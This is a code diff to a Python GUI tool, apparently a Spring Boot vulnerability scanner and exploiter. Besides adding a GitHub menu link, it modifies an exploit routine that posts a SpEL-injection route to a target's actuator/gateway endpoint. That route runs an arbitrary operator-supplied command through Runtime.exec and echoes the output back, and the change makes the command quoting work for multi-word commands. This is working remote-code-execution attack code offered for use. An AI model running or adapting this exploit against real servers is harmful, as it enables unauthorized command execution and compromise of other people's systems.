@@ -156,6 +156,7 @@ class RootFrom:
         menu_get.add_command(label='FafaViewer',command=self.fofa_viewer)
         menu_get.add_command(label='MoreVules',command=self.more_vules)
         menu_get.add_command(label='nmap',command=self.nmap_download)
+        menu_get.add_command(label='Git项目',command=self.git_hub)
         def Menu_Right(event):
             global right
             menu_right.post(event.x_root,event.y_root)
@@ -201,6 +202,7 @@ class RootFrom:
         right_more.add_command(label='FafaViewer',command=self.fofa_viewer)
         right_more.add_command(label='MoreVules',command=self.more_vules)
         right_more.add_command(label='nmap',command=self.nmap_download)
+        right_more.add_command(label='Git项目',command=self.git_hub)
         self.root.bind("<Control-q>",Scan_Right)
         self.root.bind("<Control-Q>",Scan_Right)
         self.root.bind("<Control-r>",Vule_Right)
@@ -232,9 +234,11 @@ class RootFrom:
     def more_vules(self):
         webbrowser.open('https://github.com/hongyan454/SpringBootVulExploit')
     def software_info(self):
-        messagebox.showinfo("软件信息","write by 13exp")
+        messagebox.showinfo("软件信息","write by 13exp\nhttps://github.com/13exp/SpringBoot-Scan-GUI")
     def nmap_download(self):
         webbrowser.open('https://nmap.org/download.html#windows')
+    def git_hub(self):
+        webbrowser.open('https://github.com/13exp/SpringBoot-Scan-GUI')
     def Openfiledir1(self):
         filetypes=[('txt','*.txt'),('all','*.*')]
         path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
@@ -980,11 +984,12 @@ class RootFrom:
         tar = '[+]target ' + url
         self.info_text.insert(tk.INSERT,tar)
         self.info_text.insert(tk.INSERT, '\n')
-        if "bash" in execcmd:
-            cmdlist = execcmd.split(" ")
-            execcmd = "\"" + "\", \"".join(cmdlist) + "\""
+        execcmd = execcmd.strip("\n").strip(" ")
+        if " " in execcmd :
+            cmd = execcmd.split(" ")
+            execcmd = "\\\""  + "\\\", \\\"".join(cmd) + "\\\"" 
         else:
-            execcmd = execcmd
+            execcmd = "\\\"" + execcmd + "\\\"" 
         if self.log_var.get() == "启用":
             with open("vuleLogs.log","a") as f:
                 f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
@@ -1006,7 +1011,7 @@ class RootFrom:
                   "id": "hacktest",\r
                   "filters": [{\r
                     "name": "AddResponseHeader",\r
-                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"%s\\"}).getInputStream()))}"}\r
+                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{%s}).getInputStream()))}"}\r
                     }],\r
                   "uri": "http://example.com",\r
                   "order": 0\r
@@ -1027,7 +1032,7 @@ class RootFrom:
                 re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
             #if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             if re5.status_code == 200:
-                back = "[+] Payload已经输出，回显结果如下：" + '\n' + re3.text + '[END]'
+                back = "[+] Payload已经输出，回显结果如下：" + '\n' + re3.text.encode("utf-8").decode("unicode_escape") + '[END]'
                 self.info_text.insert(tk.INSERT,back)
                 self.info_text.insert(tk.INSERT, '\n')
             else:
